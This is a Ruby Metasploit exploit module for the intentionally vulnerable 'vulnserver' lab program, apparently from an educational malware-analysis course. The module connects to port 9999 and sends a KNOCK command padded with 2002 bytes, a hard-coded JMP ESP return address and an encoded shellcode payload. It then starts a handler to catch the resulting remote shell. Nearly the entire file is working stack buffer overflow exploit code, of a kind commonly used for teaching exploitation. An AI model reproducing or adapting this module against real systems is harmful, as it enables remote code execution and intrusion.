##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',
      'Description'    => %q{
         vulnserver is intentially written vulnerable.
      },
      'Author'         => [ 'fxw' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/tree/main/Buffer-Overflow/BOF-Remote' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },      
      'Payload'        =>
        {
 #         'Space'    => 5000,
          'BadChars' => "\x00\x0a"
        },
      'Platform'       => 'Win',
      'Targets'        =>
        [
          [ 'vulnserver-Xinwen Fu',
            {
              'jmpesp' => 0x6250151C # This will be available in `target.ret`
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))

    register_options(
      [
        Opt::RPORT(9999),
	Opt::LPORT(11111)
      ])
  end

  def exploit
    print_status("Connecting to target...")
    connect

    sock.get_once
 #   shell = 
 
    shellcode = payload.encoded
    outbound = "KNOCK /.:/" + "A"*2002 + "\x1c\x15\x50\x62" + "C"*32 + shellcode
    print_status("Outbound data: \"#{outbound}\"")
    hexed = shellcode.dump
    print_status("Payload in hex: \"#{hexed}\"")

    print_status("Trying target #{target.name}...")

    sock.put(outbound)

    handler
#    disconnect
  end
end
